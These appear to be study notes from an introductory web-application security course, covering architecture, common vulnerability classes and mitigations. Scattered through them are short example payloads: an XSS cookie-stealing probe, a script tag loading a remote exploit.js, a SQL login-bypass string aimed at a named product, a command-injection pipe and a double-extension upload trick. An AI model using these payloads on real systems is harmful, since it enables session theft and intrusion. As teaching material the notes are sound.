# Introduction to Web Applications

## 🎯 Main Idea
- Understand how web applications are built and structured: front end vs back end, architecture models, and core components.
- Introduce the most common front-end and back-end web vulnerabilities (a high-level OWASP-style tour).
- Build the mental model needed before diving into hands-on exploitation of each vulnerability class in later modules.
- Concept-only module — the cheatsheet is a download link, not commands.

## 💥 Attack / Exploit Vectors
### Sensitive Data Exposure
- Sensitive data (credentials, hashes, hidden links, debug params) left in client-side source code / comments.
- Review page source early; `View Page Source` (`CTRL+U`) or via Burp — not blocked by disabling right-click.
- Example: `<!-- TODO: remove test credentials test:test -->` left in HTML.

### HTML Injection
- Unfiltered user input rendered as HTML on the page (reflected from back end DB or directly via front-end JS).
- Impact: fake login forms to phish credentials, page defacement, malicious ads.
- Example payload: `<style> body { background-image: url('...'); } </style>`

### Cross-Site Scripting (XSS)
- Injecting JavaScript that executes on the victim's client-side; can steal sessions / hijack accounts.
- Types: `Reflected` (input echoed after processing), `Stored` (persisted in DB, e.g. comments), `DOM` (written directly to a DOM object).
- Example payload: `#"><img src=/ onerror=alert(document.cookie)>`

### Cross-Site Request Forgery (CSRF)
- Forces an authenticated victim's browser to perform actions (e.g. password change) without consent, often chained with XSS.
- Target admins to pivot to server control; load a remote exploit script.
- Example payload: `"><script src=//www.example.com/exploit.js></script>`

### Broken Authentication / Access Control
- Bypass auth to log in without credentials, or access pages/features above your privilege (e.g. normal user reaching admin panel).
- Example auth bypass (College Management System 1.2): email `' or 0=0 #` with any password.

### Malicious File Upload
- Upload a server-side script (e.g. PHP) when uploads are not properly validated → remote command execution.
- Validation can be bypassed, e.g. double extension `shell.php.jpg`.

### Command Injection
- App passes unsanitized user input into OS commands; attacker appends their own command.
- Example (Plainview Activity Monitor): inject `| COMMAND...` after the `ip` value.

### SQL Injection (SQLi)
- User input concatenated into a SQL query; attacker alters the query to auth bypass, exfiltrate data, or reach the host.
- Vulnerable pattern: `$query = "select * from users where name like '%$searchInput%'";`

### Public Vulnerabilities / CVEs
- First step for known apps: fingerprint the exact version, then search public exploits (Exploit DB, Rapid7 DB, Vulnerability Lab).
- Prioritize CVSS 8-10 / Remote Code Execution; also check external components (plugins) and back-end/web-server CVEs (e.g. Shellshock).
- CVSS scoring: Base/Temporal/Environmental metrics; NVD provides Base scores (v2 and v3 rating bands).

## 🛠️ Key Tools & Concepts
- Front end — HTML (structure), CSS (styling), JavaScript (client-side behavior), rendered in the browser.
- Back end — web server, application logic/code, database; not directly visible to the client.
- Web app layout — infrastructure models: Client-Server, One Server, Many Servers-One DB, Many Servers-Many DBs.
- Three-Tier Architecture — Presentation, Application, Data layers; plus microservices (stateless, SOA) and serverless.
- Back-end servers & web servers — Apache, Nginx, IIS; databases — SQL vs NoSQL.
- Dev frameworks — Laravel (PHP), Express (Node), Django (Python), Rails (Ruby).
- APIs — SOAP (XML-based) vs REST (URL-path, JSON); CRUD mapped to GET/POST/PUT/DELETE.
- Exploit DB / Rapid7 DB / NVD / CVSS calculators — public vuln research.

## 🛡️ Mitigations
- Sanitize and validate all user input on both front end and back end; also sanitize displayed output.
- Use anti-CSRF tokens and `SameSite` cookie attribute; require password re-entry for sensitive actions.
- Rely on browser XSS protections and a WAF as additional layers only, not primary defenses.
- Strip sensitive comments/data from client-side code; obfuscate/pack JS where needed.
- Apply proper access control (RBAC) and asset segmentation at the architecture-design stage.
- Validate uploaded files, patch known CVEs, and keep back-end components updated.
